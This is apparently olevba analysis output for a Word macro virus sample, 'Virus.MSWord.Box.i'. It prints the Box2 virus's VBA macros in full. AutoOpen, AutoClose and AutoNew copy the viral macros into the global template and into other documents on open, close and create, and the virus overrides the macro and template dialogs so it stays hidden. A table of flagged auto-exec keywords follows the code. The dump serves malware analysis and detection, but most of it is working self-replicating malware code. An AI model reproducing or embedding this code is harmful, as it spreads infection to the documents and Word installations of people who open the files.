olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Box.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Box.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Box.i - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "更改使用中範本和範本選項"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
'Dim dlg As FileTemplates
'GetCurValues dlg
'Dialog dlg
'FileTemplates dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Box.i - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "執行,建立,刪除或修訂巨集"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
WordBasic.CurValues.ToolsMacro dlg
'Dialog dlg
'ToolsMacro dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Box.i - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
Dim B$
Dim macro1
Dim i
Dim N
Dim macro2
Dim j
Dim NN
On Error Resume Next
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
A$ = _
dlg.Template
B$ = _
WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)
macro1 = WordBasic.CountMacros(0)
If macro1 > 0 Then
For i = 1 To macro1
If WordBasic.[MacroName$](i, 0) = "Box2" Then N = 1
Next i
End If
If N <> 1 Then
WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="AutoClose", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="AutoOpen", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="AutoNew", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="Box2", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="ToolsMacro", _
Tab:=1 + 1 + _
1


WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="FileTemplates", _
Tab:=1 + 1 + _
1


End If

macro2 = WordBasic.CountMacros(1)
If macro2 > 0 Then
   For j = 1 To macro2
       If WordBasic.[MacroName$](j, 1) = "Box2" Then NN = 1
   Next j
End If
If NN <> 1 Then

WordBasic.FileSaveAs _
Format:= _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="AutoClose", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="AutoOpen", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="AutoNew", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="Box2", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="ToolsMacro", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="FileTemplates", _
Tab:=1 + 1 + _
1

End If

exit_:

End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Box.i - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
Dim B$
Dim macro1
Dim i
Dim N
Dim macro2
Dim j
Dim NN
On Error Resume Next
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
A$ = _
dlg.Template
B$ = _
WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)
macro1 = WordBasic.CountMacros(0)
If macro1 > 0 Then
For i = 1 To macro1
If WordBasic.[MacroName$](i, 0) = "Box2" Then N = 1
Next i
End If
If N <> 1 Then
WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="AutoClose", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="AutoOpen", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="AutoNew", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="Box2", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="ToolsMacro", _
Tab:=1 + 1 + _
1


WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="FileTemplates", _
Tab:=1 + 1 + _
1


End If

macro2 = WordBasic.CountMacros(1)
If macro2 > 0 Then
   For j = 1 To macro2
       If WordBasic.[MacroName$](j, 1) = "Box2" Then NN = 1
   Next j
End If
If NN <> 1 Then

WordBasic.FileSaveAs _
Format:= _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="AutoClose", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="AutoOpen", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="AutoNew", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="Box2", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="ToolsMacro", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="FileTemplates", _
Tab:=1 + 1 + _
1

End If

exit_:

End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Box.i - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
Dim B$
Dim macro1
Dim i
Dim N
Dim macro2
Dim j
Dim NN
On Error Resume Next
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
A$ = _
dlg.Template
B$ = _
WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)
macro1 = WordBasic.CountMacros(0)
If macro1 > 0 Then
For i = 1 To macro1
If WordBasic.[MacroName$](i, 0) = "Box2" Then N = 1
Next i
End If
If N <> 1 Then
WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="AutoClose", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="AutoOpen", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="AutoNew", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="Box2", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="ToolsMacro", _
Tab:=1 + 1 + _
1


WordBasic.Organizer _
Copy:=1, _
Source:=B$, _
Destination:=A$, _
Name:="FileTemplates", _
Tab:=1 + 1 + _
1


End If

macro2 = WordBasic.CountMacros(1)
If macro2 > 0 Then
   For j = 1 To macro2
       If WordBasic.[MacroName$](j, 1) = "Box2" Then NN = 1
   Next j
End If
If NN <> 1 Then

WordBasic.FileSaveAs _
Format:= _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="AutoClose", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="AutoOpen", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="AutoNew", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="Box2", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="ToolsMacro", _
Tab:=1 + 1 + _
1

WordBasic.Organizer _
Copy:=1, _
Source:=A$, _
Destination:=B$, _
Name:="FileTemplates", _
Tab:=1 + 1 + _
1

End If

exit_:

End Sub

-------------------------------------------------------------------------------
VBA MACRO Box2.bas 
in file: Virus.MSWord.Box.i - OLE stream: 'Macros/VBA/Box2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Rem new macro virus ---- BOX2
Rem new macro virus ---- BOX2
Rem new macro virus ---- BOX2
Rem new macro virus ---- BOX2
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

